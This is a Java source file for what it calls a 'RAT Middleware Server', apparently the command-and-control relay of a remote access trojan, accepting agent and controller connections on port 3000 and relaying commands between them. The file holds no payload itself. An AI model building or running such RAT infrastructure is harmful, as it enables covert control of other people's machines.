package com.stoppedwumm.rat;

import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.TimeUnit;
import java.util.stream.Collectors;

import com.stoppedwumm.rat.ServerShit.Handler;
import com.stoppedwumm.rat.commands.HelpCommand;
import com.stoppedwumm.rat.commands.ListClientsCommand;
import com.stoppedwumm.rat.commands.RelayAllCommand;
import com.stoppedwumm.rat.commands.RelayCommand;

public class App {
    private static final int PORT = 3000;
    private static final int MAX_THREADS = 20;
    private static volatile boolean isServerRunning = true;

    private final Map<String, Handler> activeClients = new ConcurrentHashMap<>();
    private ExecutorService clientHandlerPool;
    private final CommandRegistry commandRegistry; // Made final, initialized in constructor

    public App() {
        this.commandRegistry = new CommandRegistry();
        registerCommands();
    }

    private void registerCommands() {
        commandRegistry.registerCommand("LIST_CLIENTS", new ListClientsCommand());
        commandRegistry.registerCommand("RELAY", new RelayCommand());
        commandRegistry.registerCommand("HELP", new HelpCommand());
        commandRegistry.registerCommand("RELAY_ALL", new RelayAllCommand());
        System.out.println("Server commands registered.");
    }

    public CommandRegistry getCommandRegistry() {
        return this.commandRegistry;
    }

    public void startServer() {
        System.out.println("Starting RAT Middleware Server on port " + PORT);
        clientHandlerPool = Executors.newFixedThreadPool(MAX_THREADS);

        Runtime.getRuntime().addShutdownHook(new Thread(() -> {
            System.out.println("Shutdown hook initiated...");
            isServerRunning = false;

            // Attempt to close the server socket to stop accepting new connections
            // This is a bit of a forceful way; normally, the main loop would exit via isServerRunning
            // For robust shutdown, you might need to interrupt the serverSocket.accept() call.
            // However, for typical Ctrl+C, isServerRunning and closing client connections is key.

            activeClients.values().forEach(Handler::closeConnection); // Close client sockets
            activeClients.clear();

            clientHandlerPool.shutdown();
            try {
                if (!clientHandlerPool.awaitTermination(5, TimeUnit.SECONDS)) {
                    clientHandlerPool.shutdownNow();
                    if (!clientHandlerPool.awaitTermination(5, TimeUnit.SECONDS)) {
                        System.err.println("Client handler pool did not terminate");
                    }
                }
            } catch (InterruptedException ie) {
                clientHandlerPool.shutdownNow();
                Thread.currentThread().interrupt();
            }
            System.out.println("Server has been shut down.");
        }));

        try (ServerSocket serverSocket = new ServerSocket(PORT)) {
            System.out.println("Server listening on port " + PORT);
            System.out.println("Waiting for client connections (Agents and Controllers)...");

            while (isServerRunning) {
                try {
                    Socket clientSocket = serverSocket.accept(); // Blocks
                    if (!isServerRunning) { // Re-check after accept() returns, in case of shutdown signal
                        clientSocket.close();
                        break;
                    }
                    System.out.println("New client connected: " + clientSocket.getInetAddress().getHostAddress() + ":" + clientSocket.getPort());
                    Handler clientTask = new Handler(clientSocket, this);
                    clientHandlerPool.submit(clientTask);
                } catch (IOException e) {
                    if (!isServerRunning || serverSocket.isClosed()) {
                        System.out.println("Server socket closed or error during shutdown, stopping accept loop.");
                        break;
                    }
                    System.err.println("Error accepting client connection: " + e.getMessage());
                }
            }
        } catch (IOException e) {
            if (isServerRunning) {
                System.err.println("Could not start server on port " + PORT + ": " + e.getMessage());
                e.printStackTrace();
            }
        } finally {
            if (clientHandlerPool != null && !clientHandlerPool.isShutdown()) {
                System.out.println("Main thread: Forcing shutdown of client handler pool.");
                clientHandlerPool.shutdownNow();
            }
            System.out.println("Server main thread finished.");
        }
    }

    public void registerClient(String clientId, Handler handler) {
        if (clientId == null || handler == null) return; // Basic null check
        activeClients.put(clientId, handler);
        System.out.println("Client registered: " + clientId + " (" + handler.getClientSocket().getInetAddress().getHostAddress() + ")");
        broadcastMessage("SERVER_ALERT: New client connected: " + clientId, null);
    }

    public void unregisterClient(String clientId) {
        if (clientId == null) return;
        Handler removedHandler = activeClients.remove(clientId);
        if (removedHandler != null) {
            System.out.println("Client unregistered: " + clientId);
            broadcastMessage("SERVER_ALERT: Client disconnected: " + clientId, clientId);
        }
    }

    public void relayMessage(String originatorId, String targetClientId, String message) {
        Handler targetHandler = activeClients.get(targetClientId);
        Handler originatorHandler = activeClients.get(originatorId);

        if (targetHandler != null) {
            targetHandler.sendMessage("FROM " + originatorId + ": " + message);
            System.out.println("Relayed from [" + originatorId + "] to [" + targetClientId + "]: " + message);
            if (originatorHandler != null) {
                originatorHandler.sendMessage("SERVER_MSG: Message successfully relayed to " + targetClientId);
            }
        } else {
            if (originatorHandler != null) {
                originatorHandler.sendMessage("SERVER_ERROR: Target client " + targetClientId + " not found or not connected.");
            }
            System.err.println("Failed to relay: Target client " + targetClientId + " not found for originator " + originatorId);
        }
    }

    public void sendClientList(String requesterId) {
        Handler requesterHandler = activeClients.get(requesterId);
        if (requesterHandler != null) {
            String clientListString;
            if (activeClients.size() <= 1 && activeClients.containsKey(requesterId)) {
                clientListString = ""; // Only the requester is connected
            } else {
                clientListString = activeClients.keySet().stream()
                        .filter(id -> !id.equals(requesterId))
                        .collect(Collectors.joining(", "));
            }

            if (clientListString.isEmpty()) {
                requesterHandler.sendMessage("SERVER_CLIENT_LIST: No other clients connected.");
            } else {
                requesterHandler.sendMessage("SERVER_CLIENT_LIST: " + clientListString);
            }
        }
    }

    public void broadcastMessage(String message, String exceptClientId) {
        // System.out.println("Broadcasting: " + message); // Can be verbose
        for (Map.Entry<String, Handler> entry : activeClients.entrySet()) {
            if (exceptClientId == null || !entry.getKey().equals(exceptClientId)) {
                entry.getValue().sendMessage(message);
            }
        }
    }

    public static void main(String[] args) {
        App server = new App();
        server.startServer();
    }
}